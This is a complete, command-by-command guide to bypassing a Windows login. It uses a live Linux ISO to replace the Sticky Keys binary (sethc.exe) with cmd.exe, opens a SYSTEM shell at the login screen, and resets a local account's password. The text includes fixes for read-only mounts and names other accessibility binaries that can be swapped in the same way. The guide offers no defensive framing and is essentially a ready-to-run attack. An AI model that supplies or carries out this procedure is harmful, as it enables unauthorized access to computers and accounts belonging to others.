**Windows**

The procedure requires the target Windows machine and a live Linux ISO. All modification occurs from the Linux environment. Windows is not booted until the binary substitution is complete.

The method requires that BitLocker is disabled, or that the operator halts at the unlock screen. No step in this procedure defeats BitLocker protection.

**Boot the live ISO**

The ISO is booted on the target machine and a terminal is opened.

**Identify the Windows volume**

```
lsblk -f
sudo fdisk -l
```

The target is the large NTFS partition, `/dev/nvme0n1p3` in this example. The EFI and recovery partitions are excluded.

Any volume mounted automatically by the live desktop is released first. A read-only mount is the most frequent cause of a failure at the copy stage.

```
sudo umount /media/*/ 2>/dev/null
```

**Clear the dirty flag**

Windows marks the NTFS volume dirty and creates a hibernation file when Fast Startup is enabled. Either condition forces a read-only mount.

```
sudo ntfsfix /dev/nvme0n1p3
```

If the utility reports errors it cannot resolve, the command is repeated. The tool clears the journal state and leaves the volume writable.

**Mount the volume read-write**

```
sudo mkdir -p /mnt/win
sudo mount -t ntfs-3g -o rw,remove_hiberfile /dev/nvme0n1p3 /mnt/win
```

The `remove_hiberfile` option deletes `hiberfil.sys`. Without it the volume remains read-only regardless of the `rw` flag.

Write access is verified before proceeding.

```
mount | grep /mnt/win
```

The output must report `rw`. An `ro` result indicates the mount ignored the requested mode, in which case the volume is unmounted and the `ntfsfix` step is repeated.

**Substitute the Sticky Keys binary**

```
cd /mnt/win/Windows/System32
sudo mv sethc.exe sethc.exe.bak
sudo cp cmd.exe sethc.exe
```

Windows holds locks on these files only while it is running. Since Windows is not running, the substitution succeeds from Linux. A permission error at the copy stage indicates a read-only mount, not a locked file.

The result is verified.

```
ls -l cmd.exe sethc.exe
```

Matching file sizes confirm the substitution.

**Unmount and boot Windows**

```
sudo umount /mnt/win
sudo reboot
```

The ISO is removed so that the internal disk boots.

**Obtain a SYSTEM shell at the login screen**

The Shift key is pressed five times. Sticky Keys resolves to `cmd.exe` and executes with SYSTEM integrity.

```
whoami
```

The expected output is `nt authority\system`.

**Change the account password**

```
net user
net user Student NewPass123
```

The account name is taken from the output of `net user`. The machine is then accessed with the new credential.

**Restore the original binary**

The live ISO is booted again, the volume is mounted as before, and the exchange is reversed.

```
cd /mnt/win/Windows/System32
sudo rm sethc.exe
sudo mv sethc.exe.bak sethc.exe
sudo umount /mnt/win
```

**Failure conditions**

BitLocker enabled: the procedure halts, the recovery key is required.
The mount reports `ro` and `ntfsfix` does not clear it: Fast Startup was active. Windows is booted once normally and shut down cleanly, or the `remove_hiberfile` option is applied.
`cmd.exe` resides in `System32` on both 32 and 64 bit installations, so no alternate path is required.
The same substitution applies to `utilman.exe`, `osk.exe`, and `narrator.exe` when `sethc.exe` has already been replaced.
